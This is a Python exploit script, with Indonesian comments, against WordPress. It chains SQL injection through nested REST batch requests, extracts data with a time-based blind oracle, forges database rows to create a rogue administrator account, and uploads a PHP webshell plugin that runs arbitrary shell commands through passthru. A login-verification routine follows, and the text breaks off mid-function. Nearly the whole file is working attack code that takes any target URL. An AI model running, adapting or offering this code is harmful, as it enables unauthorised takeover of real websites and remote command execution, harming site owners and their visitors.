#!/usr/bin/env python3
"""Add-admin dari PreAuthRCE (wp2shell.py) + verify login.

Usage:
  python3 forge_admin_v2.py https://TARGET.com
  python3 forge_admin_v2.py https://TARGET.com --user myadmin --pass mypass
  python3 forge_admin_v2.py https://TARGET.com --delay 0.25
  python3 forge_admin_v2.py https://TARGET.com --prefix wp_
"""
import sys, os, json, time, secrets, hashlib, re, ssl, socket, urllib.request, urllib.parse, argparse, threading
from concurrent.futures import ThreadPoolExecutor, as_completed

# ---------- DNS pre-check (murah: 1x per target, thread + join(timeout) karena
#          socket.getaddrinfo() tidak support timeout di stdlib) ----------
_dns_cache = {}
_dns_executor = ThreadPoolExecutor(max_workers=8)

def _resolve_host(host):
    """Run getaddrinfo in worker thread; return (ip, None) or (None, err)."""
    try:
        infos = socket.getaddrinfo(host, None, socket.AF_INET)
        return (infos[0][4][0] if infos else "?", None)
    except socket.gaierror as e:
        return (None, "DNS_FAIL: %s" % str(e)[:80])
    except Exception as e:
        return (None, "DNS_ERR: %s" % str(e)[:80])

def dns_precheck(base, timeout=5.0, use_cache=True):
    """Return (True, ip) if host resolves, (False, err) otherwise.
    Cache prevents re-querying same host in multi-target runs.
    Overhead: ~5ms (cache hit) / ~50ms (cache miss) / timeout (worst case)."""
    host = urllib.parse.urlsplit(base).netloc.split(":")[0]
    if use_cache and host in _dns_cache:
        return _dns_cache[host]
    fut = _dns_executor.submit(_resolve_host, host)
    try:
        ip, err = fut.result(timeout=timeout)
        ok = (True, ip) if err is None else (False, err)
    except Exception:
        ok = (False, "DNS_TIMEOUT after %.1fs" % timeout)
    _dns_cache[host] = ok
    return ok
log_lock = threading.Lock()
print_lock = threading.Lock()

import base64, html as html_mod, statistics, io, zipfile, uuid, shlex, http.cookiejar
import urllib.error

class _KeepPost(urllib.request.HTTPRedirectHandler):
    """Follow redirects but PRESERVE the POST method and body. urllib's default
    handler downgrades a redirected POST to a bodyless GET (301/302/303), which
    would silently drop the batch payload when a site redirects http->https or
    to a canonical host and produce a false negative. Loop protection
    (max_redirections) is still enforced by the parent."""
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        if req.get_method() == "POST" and code in (301, 302, 303, 307, 308):
            hdrs = {k: v for k, v in req.header_items()
                    if k.lower() != "content-length"}
            return urllib.request.Request(newurl, data=req.data, headers=hdrs,
                                          origin_req_host=req.origin_req_host,
                                          unverifiable=True, method="POST")
        return super().redirect_request(req, fp, code, msg, headers, newurl)


# ==========================================================================

class PreAuthRCE:
    UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
          "(KHTML, like Gecko) Chrome/126.0 Safari/537.36")
    PRIMER = "http://:"
    EMBED_ATTR = 'a:2:{s:5:"width";s:3:"500";s:6:"height";s:3:"750";}'

    def __init__(self, base, timeout=30, proxy=None, sleep=4.0, route="auto"):
        self.base = base.rstrip("/")
        self.timeout = timeout
        self.sleep = float(sleep)
        self.route = route
        self._proxy = proxy
        self.batch = None        # resolved endpoint URL (canonical, post-redirect)
        self._base = 0.0         # measured baseline round-trip (used by the oracle)
        self._normalized = False
        # Ignore TLS verification (self-signed / expired certs common on test
        # targets). Equivalent to `curl -k`.
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        handlers = [urllib.request.HTTPSHandler(context=ctx), _KeepPost()]
        if proxy:
            handlers.append(urllib.request.ProxyHandler({"http": proxy, "https": proxy}))
        else:
            handlers.append(urllib.request.ProxyHandler({}))  # ignore env proxies
        self.opener = urllib.request.build_opener(*handlers)

    def _normalize_base(self):
        """Follow redirects on the root once and pin the canonical scheme://host
        so the batch POST goes straight to the final host. Only scheme+host are
        taken (never a redirected path), so REST routes stay correct."""
        if self._normalized:
            return
        self._normalized = True
        try:
            req = urllib.request.Request(self.base + "/", headers={"User-Agent": self.UA})
            with self.opener.open(req, timeout=self.timeout) as r:
                u = urllib.parse.urlparse(r.geturl())
                if u.scheme and u.netloc:
                    canon = "%s://%s" % (u.scheme, u.netloc)
                    if canon != self.base:
                        self.base = canon
                        self.batch = None
        except Exception:
            pass

    def _raw(self, url, data=None, headers=None, method=None):
        hdrs = dict(headers or {})
        hdrs.setdefault("User-Agent", self.UA)
        req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
        t0 = time.perf_counter()
        try:
            with self.opener.open(req, timeout=self.timeout) as r:
                return r.status, time.perf_counter() - t0, r.read(), r.geturl()
        except urllib.error.HTTPError as e:
            return e.code, time.perf_counter() - t0, e.read(), getattr(e, "url", url)

    def _endpoints(self):
        if self.route == "wp-json":
            return [self.base + "/wp-json/batch/v1"]
        if self.route == "rest-route":
            return [self.base + "/?rest_route=/batch/v1"]
        return [self.base + "/?rest_route=/batch/v1", self.base + "/wp-json/batch/v1"]

    @staticmethod
    def _envelope(author_exclude):
        """Nested batch (route confusion) landing author_exclude in author__not_in."""
        enc = urllib.parse.quote(author_exclude, safe="")
        inner = {"requests": [
            {"method": "POST", "path": "///"},
            {"method": "GET",  "path": "/wp/v2/users?author_exclude=" + enc},
            {"method": "GET",  "path": "/wp/v2/posts"},
        ]}
        return {"requests": [
            {"method": "POST", "path": "/v2/categories", "body": {"name": "x"}},
            {"method": "POST", "path": "///", "body": {"name": "x"}},
            {"method": "POST", "path": "/wp/v2/posts", "body": inner},
            {"method": "POST", "path": "/batch/v1", "body": {"requests": []}},
        ]}

    def probe(self, author_exclude):
        """Send one injection carrying author_exclude into author__not_in."""
        self._normalize_base()
        body = json.dumps(self._envelope(author_exclude)).encode()
        headers = {"Content-Type": "application/json"}
        if self.batch is None:
            for ep in self._endpoints():
                st, _, _, final = self._raw(ep, data=body, headers=headers, method="POST")
                if st in (200, 207):
                    self.batch = final
                    break
            if self.batch is None:
                self.batch = self._endpoints()[0]
        st, el, _, _ = self._raw(self.batch, data=body, headers=headers, method="POST")
        return st, el

    @staticmethod
    def _sleep_payload(seconds):
        return "0) OR (SELECT 1 FROM (SELECT SLEEP(%g))x)-- -" % seconds

    def detect(self, rounds=3):
        fast = statistics.median(self.probe(self._sleep_payload(0))[1] for _ in range(rounds))
        slow = statistics.median(self.probe(self._sleep_payload(self.sleep))[1] for _ in range(rounds))
        self._base = fast
        delta = slow - fast
        vulnerable = delta >= (self.sleep * 0.6) and fast < (self.sleep * 0.5)
        return {"fast": fast, "slow": slow, "delta": delta, "vulnerable": vulnerable}

    def _oracle(self, cond, unit=0.6):
        payload = "0) OR (SELECT 1 FROM (SELECT IF((%s),SLEEP(%g),0))x)-- -" % (cond, unit)
        _, el = self.probe(payload)
        return el > (self._base + unit * 0.6)

    def read_scalar(self, expr, maxlen=40, unit=0.6):
        v = "COALESCE((%s),'')" % expr
        lo, hi = 0, maxlen
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self._oracle("CHAR_LENGTH(%s)>=%d" % (v, mid), unit):
                lo = mid
            else:
                hi = mid - 1
        out = ""
        for pos in range(1, lo + 1):
            a, b = 32, 126
            while a < b:
                mid = (a + b + 1) // 2
                if self._oracle("ASCII(SUBSTRING(%s,%d,1))>=%d" % (v, pos, mid), unit):
                    a = mid
                else:
                    b = mid - 1
            out += chr(a)
        return out

    def read_int(self, query, unit=0.6):
        expr = "COALESCE((%s),0)" % query
        lo, hi = 0, 1
        while self._oracle("%s >= %d" % (expr, hi), unit):
            lo, hi = hi, hi * 2
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self._oracle("%s >= %d" % (expr, mid), unit):
                lo = mid
            else:
                hi = mid - 1
        return lo

    # -- RCE: row forgery + oEmbed -> changeset -> re-entry -> admin creation --
    def _rce_send(self, inner_requests, timeout=None):
        payload = {"requests": [
            {"method": "POST", "path": self.PRIMER},
            {"method": "POST", "path": "/wp/v2/posts",
             "body": {"requests": inner_requests}},
            {"method": "POST", "path": "/batch/v1"},
        ]}
        ep = self.batch or self._endpoints()[0]
        body = json.dumps(payload).encode()
        hdrs = {"Content-Type": "application/json", "User-Agent": self.UA}
        req = urllib.request.Request(ep, data=body, headers=hdrs, method="POST")
        try:
            with self.opener.open(req, timeout=timeout or self.timeout) as resp:
                return resp.read()
        except urllib.error.HTTPError as e:
            return e.read()

    @staticmethod
    def _hex(value):
        return "0x%s" % value.encode().hex() if value else "''"

    def _post_row(self, post_id, content, title, status, name, parent, post_type):
        h = self._hex
        return ",".join((
            str(post_id), "1",
            h("2020-01-01 00:00:00"), h("2020-01-01 00:00:00"),
            h(content), h(title), "''",
            h(status), h("closed"), h("closed"), "''",
            h(name), "''", "''",
            h("2020-01-01 00:00:00"), h("2020-01-01 00:00:00"), "''",
            str(parent), "''", "0",
            h(post_type), "''", "0",
        ))

    def _forge(self, rows, extra_requests=()):
        query = ("1) AND 1=0 UNION ALL SELECT "
                 + " UNION ALL SELECT ".join(rows) + " -- -")
        self._rce_send([
            {"method": "GET", "path": self.PRIMER},
            {"method": "GET", "path": "/wp/v2/widgets?"
             + urllib.parse.urlencode({"author_exclude": query, "per_page": -1,
                                       "orderby": "none", "context": "view"})},
            {"method": "GET", "path": "/wp/v2/posts"},
            *extra_requests,
        ], timeout=60)

    def deploy(self):
        """Run the full pre-auth chain up to a live, self-cleaning webshell.
        Returns (username, password, run, cleanup): run(command) executes one
        shell command and returns its output; cleanup() deactivates and deletes
        the dropped plugin. The forged administrator is left in place. Splitting
        deploy from run lets a caller execute many commands (interactive shell)
        over one dropped webshell before cleaning up."""
        self._normalize_base()

        # 1. published post (post/page/media) for oEmbed anchor
        anchor = None
        for coll in ("posts", "pages"):
            try:
                with self.opener.open(
                    urllib.request.Request(
                        self.base + "/?rest_route=/wp/v2/%s&per_page=1&_fields=link" % coll,
                        headers={"User-Agent": self.UA}), timeout=15) as resp:
                    items = json.loads(resp.read())
            except Exception:
                items = []
            if items and items[0].get("link"):
                anchor = items[0]["link"]
                break
        if not anchor:
            raise RuntimeError("no published post/page for oEmbed anchor")

        link = urllib.parse.urlsplit(anchor)
        token = secrets.token_hex(6)
        embed_urls = [
            urllib.parse.urlunsplit((
                link.scheme, link.netloc, link.path, link.query,
                "%s%d" % (token, i)))
            for i in range(3)]

        # 2. seed 3 oEmbed caches (forged post with [embed] shortcodes -> DB writes)
        sys.stderr.write("[2/6] seeding oEmbed caches (read-only SQLi -> real DB writes) ...\n")
        seed_content = "".join(
            '[embed width="500" height="750"]%s[/embed]' % u for u in embed_urls)
        self._forge([self._post_row(
            0, seed_content, "seed", "publish", "seed", 0, "post")])

        # 3. extract table prefix, admin ID, seeded cache post IDs
        sys.stderr.write("[3/6] recon: reading DB table prefix via blind SQLi ...\n")
        posts_table = self.read_scalar(
            "SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES "
            "WHERE TABLE_SCHEMA=DATABASE() "
            "AND RIGHT(TABLE_NAME,6)=0x5f706f737473 "
            "ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1", 64)
        if not re.fullmatch(r"[A-Za-z0-9_$]+", posts_table):
            raise RuntimeError("could not resolve posts table (%r)" % posts_table)
        prefix = posts_table[:-5]
        sys.stderr.write("[+] table prefix: %s\n" % (prefix or "(empty)"))

        sys.stderr.write("[3/6] recon: locating an administrator account ...\n")
        admin_id = self.read_int(
            "SELECT u.ID FROM `%susers` u JOIN `%susermeta` m "
            "ON m.user_id=u.ID WHERE m.meta_key=%s "
            "AND INSTR(m.meta_value,%s)>0 "
            "ORDER BY u.ID LIMIT 1" % (
                prefix, prefix,
                self._hex(prefix + "capabilities"),
                self._hex('s:13:"administrator";b:1;')))
        if admin_id < 1:
            raise RuntimeError("could not locate an administrator")
        sys.stderr.write("[+] admin ID: %d\n" % admin_id)

        sys.stderr.write("[3/6] recon: recovering seeded oEmbed cache post IDs ...\n")
        cache_ids = []
        for u in embed_urls:
            key = hashlib.md5((u + self.EMBED_ATTR).encode()).hexdigest()
            pid = self.read_int(
                "SELECT ID FROM `%s` WHERE post_type=0x6f656d6265645f6361636865 "
                "AND post_name=0x%s ORDER BY ID DESC LIMIT 1" % (
                    posts_table, key.encode().hex()))
            if pid < 1:
                raise RuntimeError("oEmbed cache seeding failed")
            cache_ids.append(pid)
        if len(set(cache_ids)) != 3:
            raise RuntimeError("oEmbed cache IDs not distinct")
        sys.stderr.write("[+] cache IDs: %s\n" % cache_ids)

        # 4. forge changeset elevation + re-entrant parse_request, create admin
        username = "w2s_%s" % token
        password = "W2s!%s" % secrets.token_urlsafe(15)
        email = "%s@wp2shell.local" % username
        outer = 1800000000 + secrets.randbelow(100000000)
        nav_id, inner_id = outer + 1, outer + 2

        changeset = json.dumps({
            "nav_menu_item[%d]" % nav_id: {
                "value": {
                    "object_id": 0, "object": "", "menu_item_parent": 0,
                    "position": 0, "type": "custom", "title": "proof",
                    "url": "https://github.com/dinosn/wp2shell-lab",
                    "target": "", "attr_title": "", "description": "proof",
                    "classes": "", "xfn": "", "status": "publish",
                    "nav_menu_term_id": 0, "_invalid": False,
                },
                "type": "nav_menu_item", "user_id": admin_id,
            }
        }, separators=(",", ":"))

        poisoned = (
            self._post_row(0,
                '[embed width="500" height="750"]%s[/embed]' % embed_urls[1],
                "trigger", "publish", "trigger", 0, "post"),
            self._post_row(cache_ids[0], changeset, "changeset", "future",
                str(uuid.uuid4()), outer, "customize_changeset"),
            self._post_row(outer, "outer", "outer", "draft",
                "outer", cache_ids[0], "post"),
            self._post_row(cache_ids[1], "", "cache", "publish",
                "cache", cache_ids[0], "post"),
            self._post_row(nav_id, "nav", "nav", "publish",
                "nav", cache_ids[2], "nav_menu_item"),
            self._post_row(cache_ids[2], "parse", "parse", "parse",
                "parse", inner_id, "request"),
            self._post_row(inner_id, "inner", "inner", "draft",
                "inner", cache_ids[2], "post"),
        )
        new_admin = {"username": username, "email": email,
                     "password": password, "roles": ["administrator"]}

        sys.stderr.write("[4/6] forging changeset elevation + re-entrant "
                         "parse_request, creating administrator ...\n")
        self._forge(poisoned, extra_requests=[
            {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
            {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
        ])

        # 5. login and deploy self-cleaning webshell plugin
        sys.stderr.write("[+] administrator created: %s\n" % email)
        sys.stderr.write("[+] credentials: username=%s  password=%s\n" % (username, password))
        sys.stderr.write("[5/6] logging in and deploying self-cleaning webshell ...\n")

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sh = [urllib.request.HTTPSHandler(context=ctx),
              urllib.request.HTTPCookieProcessor(cookiejar.CookieJar()), _KeepPost()]
        if self._proxy:
            sh.append(urllib.request.ProxyHandler(
                {"http": self._proxy, "https": self._proxy}))
        else:
            sh.append(urllib.request.ProxyHandler({}))
        session = urllib.request.build_opener(*sh)

        session.open(urllib.request.Request(
            self.base + "/wp-login.php",
            headers={"User-Agent": self.UA}), timeout=15).read()
        session.open(urllib.request.Request(
            self.base + "/wp-login.php",
            data=urllib.parse.urlencode({
                "log": username, "pwd": password, "wp-submit": "Log In",
                "redirect_to": self.base + "/wp-admin/",
                "testcookie": "1"}).encode(),
            headers={"User-Agent": self.UA},
            method="POST"), timeout=30).read()

        with session.open(urllib.request.Request(
                self.base + "/wp-admin/users.php",
                headers={"User-Agent": self.UA}), timeout=30) as resp:
            users_page = resp.read().decode(errors="replace")
        if username not in users_page:
            raise RuntimeError("admin login failed (user not created?)")

        slug = "wp2shell-%s" % secrets.token_hex(6)
        route = secrets.token_hex(12)
        marker = secrets.token_hex(12)
        # The webshell persists across calls so an interactive session can run
        # many commands; it self-destructs only when called with rm=1 (cleanup()).
        php = (
            "<?php\n"
            "/* Plugin Name: %s */\n"
            "add_action('rest_api_init', function () {\n"
            "    register_rest_route('wp2shell/v1', '/%s', array(\n"
            "        'methods' => 'POST', 'permission_callback' => '__return_true',\n"
            "        'callback' => function ($r) {\n"
            "            if ($r->get_param('rm')) {\n"
            "                require_once ABSPATH.'wp-admin/includes/plugin.php';\n"
            "                deactivate_plugins(plugin_basename(__FILE__), true);\n"
            "                @unlink(__FILE__);\n"
            "                return new WP_REST_Response(array(\n"
            "                    'marker' => '%s', 'output' => 'WP2SHELL_REMOVED'));\n"
            "            }\n"
            "            ob_start(); passthru(base64_decode($r->get_param('c')).' 2>&1');\n"
            "            $o = ob_get_clean();\n"
            "            return new WP_REST_Response(array(\n"
            "                'marker' => '%s', 'output' => $o));\n"
            "        },\n"
            "    ));\n"
            "});\n" % (slug, route, marker, marker)).encode()

        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
            z.writestr("%s/%s.php" % (slug, slug), php)

        with session.open(urllib.request.Request(
                self.base + "/wp-admin/plugin-install.php?tab=upload",
                headers={"User-Agent": self.UA}), timeout=30) as resp:
            page = resp.read().decode(errors="replace")
        nonce = re.search(r'name="_wpnonce" value="([^"]+)"', page)
        if not nonce:
            raise RuntimeError("plugin-upload nonce not found")

        boundary = "----wp2shell%s" % secrets.token_hex(12)
        body = b"".join((
            ("--%s\r\nContent-Disposition: form-data; "
             "name=\"_wpnonce\"\r\n\r\n%s\r\n" % (boundary, nonce.group(1))).encode(),
            ("--%s\r\nContent-Disposition: form-data; "
             "name=\"_wp_http_referer\"\r\n\r\n"
             "/wp-admin/plugin-install.php?tab=upload\r\n" % boundary).encode(),
            ("--%s\r\nContent-Disposition: form-data; "
             "name=\"pluginzip\"; filename=\"%s.zip\"\r\n"
             "Content-Type: application/zip\r\n\r\n" % (boundary, slug)).encode(),
            buf.getvalue(),
            ("\r\n--%s--\r\n" % boundary).encode(),
        ))
        with session.open(urllib.request.Request(
                self.base + "/wp-admin/update.php?action=upload-plugin",
                data=body,
                headers={"Content-Type": "multipart/form-data; boundary=%s" % boundary,
                         "User-Agent": self.UA},
                method="POST"), timeout=60) as resp:
            install_page = resp.read().decode(errors="replace")

        activate = re.search(
            r'href="([^"]*plugins\.php\?action=activate[^"]*)"', install_page)
        if not activate:
            raise RuntimeError("plugin install/activation link not found")
        session.open(urllib.request.Request(
            urllib.parse.urljoin(self.base + "/wp-admin/",
                                html_mod.unescape(activate.group(1))),
            headers={"User-Agent": self.UA}), timeout=30).read()

        shell_url = self.base + "/?rest_route=/wp2shell/v1/%s" % route

        def _call(params):
            req = urllib.request.Request(
                shell_url, data=json.dumps(params).encode(),
                headers={"Content-Type": "application/json", "User-Agent": self.UA},
                method="POST")
            with self.opener.open(req, timeout=60) as resp:
                result = json.loads(resp.read())
            if result.get("marker") != marker:
                raise RuntimeError("webshell did not respond correctly")
            return result["output"]

        def run(command):
            return _call({"c": base64.b64encode(command.encode()).decode()})

        def cleanup():
            try:
                _call({"rm": "1"})
            except Exception:
                pass

        return username, password, run, cleanup

    def exploit(self, command):
        """One-shot pre-auth RCE: deploy, run one command, self-clean.
        Returns (username, password, command_output)."""
        username, password, run, cleanup = self.deploy()
        try:
            output = run(command)
        finally:
            cleanup()
        return username, password, output




# ANSI colors
C = dict(
    R="\033[91m", G="\033[92m", Y="\033[93m", B="\033[94m",
    M="\033[95m", C="\033[96m", W="\033[97m", D="\033[37m", N="\033[0m",
    BR="\033[1m",
)


def cprint(msg, color=None, **kw):
    color = color or C["N"]
    print("%s%s%s" % (color, msg, C["N"]), **kw)


CANDIDATE_PREFIXES = [
    "wp_", "wp_1_", "wp_2_", "wp_3_", "w_", "wps_",
    "fm_", "wq_", "xmubao", "vykc", "vy_", "xp",
]


def sanitize_table(s):
    """Strip backticks, quotes, spaces, control chars from a table name.

    Hasil dari oracle char-by-char sering bawa noise
    ('wp_pssts ', 'xmubao\x60psvysO'); dibersihkan dulu sebelum dicek."""
    s = s.strip()
    s = re.sub(r"[`'\"]", "", s)
    s = re.sub(r"\s+", "", s)
    s = s.strip()
    return s


def looks_like_posts_table(name):
    """Plausibility: identifier-safe, diakhiri 'post'/'posts'."""
    if not name:
        return False
    if not re.fullmatch(r"`?[A-Za-z0-9_$]+`?", name):
        return False
    core = name.strip("`")
    return core.endswith("post") or core.endswith("posts")


def resolve_posts_table(t, forced_prefix=None, unit=0.35, verbose=True):
    """Multi-strategi resolve nama tabel posts untuk `PreAuthRCE` target.

    Urutan (murah -> mahal, deterministik -> fuzzy):
      1. forced_prefix (kalau diminta, langsung EXISTS verify; skip scan).
      2. EXISTS loop per prefix kandidat di information_schema
         (satu oracle boolean per prefix — jauh lebih reliable di target
         nois dibanding char-by-char binary oracle lama).
      3. Scan information_schema via read_scalar (cara lama), dibersihkan
         & di-verify balik dengan EXISTS.
      4. Ultimate fallback: 'wp_'.

    Return: prefix string (tanpa underscore akhir di-retain, jadi 'wp_'
    kalau tabel 'wp_posts')."""
    def log(msg, color=None):
        if verbose:
            cprint(msg, color)

    def table_exists(tbl, u=unit):
        q = "EXISTS(SELECT 1 FROM information_schema.tables WHERE table_schema=database() AND table_name=%s)" % t._hex(tbl)
        return t._oracle(q, u)

    if forced_prefix is not None:
        cand = forced_prefix if forced_prefix.endswith("_") else forced_prefix + "_"
        tbl = cand + "posts"
        log("[poststable] forced prefix: %r -> table %r" % (cand, tbl), C["Y"])
        if table_exists(tbl):
            return cand
        log("[poststable] forced table %r does NOT exist; falling through" % tbl, C["R"])
        # lanjut ke deteksi normal (paksa gagal, jangan anggurin)

    # --- Strategi 1: deterministic EXISTS per prefix kandidat ---
    # Kandidat "wp_" di-vote 3x (mayoritas 2) karena dipakai ~70% semua target
    # & paling rentan false-negative saat sinyal flaky. Kandidat lain tetap
    # single-shot (1x) agar tidak memperlambat scan untuk prefix non-default.
    log("[poststable] deterministic prefix probing (EXISTS per candidate) ...", C["Y"])

    def exists_voted(tbl, votes):
        hits = 0
        for _ in range(votes):
            if table_exists(tbl):
                hits += 1
        return hits * 2 >= votes  # mayoritas

    seen = set()
    for cand in CANDIDATE_PREFIXES:
        if cand in seen:
            continue
        seen.add(cand)
        tbl = cand + "posts"
        votes = 3 if cand == "wp_" else 1
        if exists_voted(tbl, votes):
            log("[poststable]   hit: prefix=%r table=%r (votes=%d)" % (cand, tbl, votes), C["G"])
            return cand

    # --- Strategi 2: scan information_schema (fuzzy, char-by-char) ---
    log("[poststable] no deterministic hit; scanning information_schema ...", C["Y"])
    found = t.read_scalar(
        "SELECT TABLE_NAME FROM information_schema.tables "
        "WHERE table_schema=database() AND table_name LIKE 0x25706f737425 "
        "ORDER BY CHAR_LENGTH(TABLE_NAME),TABLE_NAME LIMIT 1",
        maxlen=64, unit=unit)
    found = sanitize_table(found)
    if looks_like_posts_table(found):
        # verify balik, jangan percaya scan buta
        if table_exists(found):
            log("[poststable]   scan hit: table=%r (verified)" % found, C["G"])
            return found[:-5]
        log("[poststable]   scan result %r failed EXISTS verify; discarding" % found, C["R"])
    else:
        log("[poststable]   scan result not plausible: %r" % found, C["R"])

    # --- Strategi 3: ultimate fallback ---
    log("[poststable] all strategies failed; assuming 'wp_' (unverified)", C["Y"])
    return "wp_"
def add_admin(base, username=None, password=None, delay=0.15, sleep=4.0,
              route="auto", timeout=30, proxy=None, verbose=True,
              force_prefix=None, oracle_unit=0.35,
              dns_precheck_flag=True, dns_timeout=5.0):
    """Clone of wp2shell.py deploy() but stop after admin is created.
    Returns (username, password, email).
    dns_precheck_flag: if True (default), run DNS pre-check before forge (cheap: ~5ms cached / 50ms fresh)."""
    def log(msg, color=None):
        if verbose:
            cprint(msg, color, file=sys.stderr, flush=True)

    # DNS pre-check: skip forge early if host doesn't resolve (saves ~60s timeout waste)
    if dns_precheck_flag:
        dns_ok, dns_detail = dns_precheck(base, timeout=dns_timeout, use_cache=True)
        if not dns_ok:
            log("[DNS] %s -> %s" % (base, dns_detail), C["R"])
            raise RuntimeError("%s: %s" % (dns_detail.split(":")[0], dns_detail))
        log("[DNS] %s -> OK (%s)" % (base, dns_detail), C["G"])

    t = PreAuthRCE(base, timeout=timeout, proxy=proxy, sleep=sleep, route=route)

    # Normalize + probe endpoint
    t._normalize_base()
    st, el = t.probe(t._sleep_payload(0))
    log("[*] probe: HTTP %d elapsed %.2fs" % (st, el), C["Y"])

    # Vulnerability check
    det = t.detect(rounds=3)
    if det["vulnerable"]:
        log("[*] vuln: fast=%.3f slow=%.3f delta=%.3f VULNERABLE" %
            (det["fast"], det["slow"], det["delta"]), C["G"])
    else:
        log("[*] vuln: fast=%.3f slow=%.3f delta=%.3f NOT VULNERABLE" %
            (det["fast"], det["slow"], det["delta"]), C["R"])
    if not det["vulnerable"]:
        raise RuntimeError("target not vulnerable (delta=%.3f)" % det["delta"])

    if username is None:
        token = secrets.token_hex(8)
        username = "w2s_" + token
        password = "W2s!" + secrets.token_urlsafe(15)
    email = username + "@wp2shell.local"
    log("[*] admin: %s / %s" % (username, password), C["M"])

    # 1. oEmbed anchor
    log("[1/4] oEmbed anchor ...", C["C"])
    anchor = None
    try:
        with t.opener.open(
                urllib.request.Request(
                    t.base + "/?rest_route=/wp/v2/posts&per_page=1&_fields=link",
                    headers={"User-Agent": t.UA}), timeout=15) as resp:
            items = json.loads(resp.read())
        if items and items[0].get("link"):
            anchor = items[0]["link"]
    except Exception:
        anchor = None
    if anchor is None:
        # Bypass: no published post -> use site base URL as oEmbed anchor
        p = urllib.parse.urlsplit(t.base)
        anchor = "%s://%s/" % (p.scheme or "https", p.netloc)
        log("    no published post -> using base URL as anchor: %s" % anchor, C["Y"])
    link = urllib.parse.urlsplit(anchor)
    tok = secrets.token_hex(6)
    embed_urls = [
        urllib.parse.urlunsplit((link.scheme, link.netloc, link.path, link.query,
                                  "%s%d" % (tok, i)))
        for i in range(3)]

    # 2. seed oEmbed caches
    log("[2/4] seeding oEmbed caches ...", C["C"])
    seed_content = "".join(
        '[embed width="500" height="750"]%s[/embed]' % u for u in embed_urls)
    t._forge([t._post_row(0, seed_content, "seed", "publish", "seed", 0, "post")])

    # 3. prefix + admin ID + cache IDs
    log("[3/4] recon: prefix + admin ID + cache IDs ...", C["C"])
    prefix = resolve_posts_table(
        t, forced_prefix=force_prefix, unit=oracle_unit, verbose=verbose)
    posts_table = prefix + "posts"
    log("    prefix: %s (table: %s)" % (prefix, posts_table), C["D"])

    admin_id = t.read_int(
        "SELECT u.ID FROM `%susers` u JOIN `%susermeta` m "
        "ON m.user_id=u.ID WHERE m.meta_key=%s "
        "AND INSTR(m.meta_value,%s)>0 "
        "ORDER BY u.ID LIMIT 1" % (
            prefix, prefix,
            t._hex(prefix + "capabilities"),
            t._hex('s:13:"administrator";b:1;')))
    if admin_id < 1:
        raise RuntimeError("could not locate an administrator")
    log("    admin ID: %d" % admin_id, C["D"])

    cache_ids = []
    for u in embed_urls:
        key = hashlib.md5((u + t.EMBED_ATTR).encode()).hexdigest()
        pid = t.read_int(
            "SELECT ID FROM `%s` WHERE post_type=0x6f656d6265645f6361636865 "
            "AND post_name=0x%s ORDER BY ID DESC LIMIT 1" % (
                posts_table, key.encode().hex()))
        if pid < 1:
            raise RuntimeError("oEmbed cache seeding failed")
        cache_ids.append(pid)
    if len(set(cache_ids)) != 3:
        raise RuntimeError("oEmbed cache IDs not distinct")
    log("    cache IDs: %s" % cache_ids, C["D"])

    # 4. forge changeset + create admin
    log("[4/4] forging changeset + creating admin ...", C["C"])
    outer = 1800000000 + secrets.randbelow(100000000)
    nav_id, inner_id = outer + 1, outer + 2

    changeset = json.dumps({
        "nav_menu_item[%d]" % nav_id: {
            "value": {
                "object_id": 0, "object": "", "menu_item_parent": 0,
                "position": 0, "type": "custom", "title": "proof",
                "url": "https://github.com/dinosn/wp2shell-lab",
                "target": "", "attr_title": "", "description": "proof",
                "classes": "", "xfn": "", "status": "publish",
                "nav_menu_term_id": 0, "_invalid": False,
            },
            "type": "nav_menu_item", "user_id": admin_id,
        }
    }, separators=(",", ":"))

    poisoned = (
        t._post_row(0,
            '[embed width="500" height="750"]%s[/embed]' % embed_urls[1],
            "trigger", "publish", "trigger", 0, "post"),
        t._post_row(cache_ids[0], changeset, "changeset", "future",
            str(__import__("uuid").uuid4()), outer, "customize_changeset"),
        t._post_row(outer, "outer", "outer", "draft",
            "outer", cache_ids[0], "post"),
        t._post_row(cache_ids[1], "", "cache", "publish",
            "cache", cache_ids[0], "post"),
        t._post_row(nav_id, "nav", "nav", "publish",
            "nav", cache_ids[2], "nav_menu_item"),
        t._post_row(cache_ids[2], "parse", "parse", "parse",
            "parse", inner_id, "request"),
        t._post_row(inner_id, "inner", "inner", "draft",
            "inner", cache_ids[2], "post"),
    )
    new_admin = {"username": username, "email": email,
                 "password": password, "roles": ["administrator"]}

    t._forge(poisoned, extra_requests=[
        {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
        {"method": "POST", "path": "/wp/v2/users", "body": new_admin},
    ])

    log("[+] administrator created: %s" % email, C["G"])
    log("[+] credentials: username=%s  password=%s" % (username, password), C["G"])
    return username, password, email


def try_login(base, username, password, timeout=30):
    """Try login via 3 paths. Returns (method, success, detail)."""
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    sh = [urllib.request.HTTPSHandler(context=ctx), urllib.request.ProxyHandler({})]
    session = urllib.request.build_opener(*sh)

    # 1. XML-RPC (paling reliable — gak kena WAF/redirect form-block)
    try:
        xml_body = ("<?xml version='1.0'?><methodCall><methodName>wp.getUsersBlogs</methodName>"
                    "<params><param><value><string>%s</string></value></param>"
                    "<param><value><string>%s</string></value></param></params></methodCall>"
                    % (username, password)).encode()
        resp = session.open(urllib.request.Request(
            base + "/xmlrpc.php", data=xml_body,
            headers={"Content-Type": "text/xml"}, method="POST"), timeout=20)
        body = resp.read().decode(errors="replace")
        if "<fault>" in body:
            fm = re.search(r"<string>(.*?)</string>", body, re.DOTALL)
            fault_msg = (fm.group(1).strip() if fm else "?")
            if any(w in fault_msg.lower() for w in ("not", "fals", "wrong", "403")):
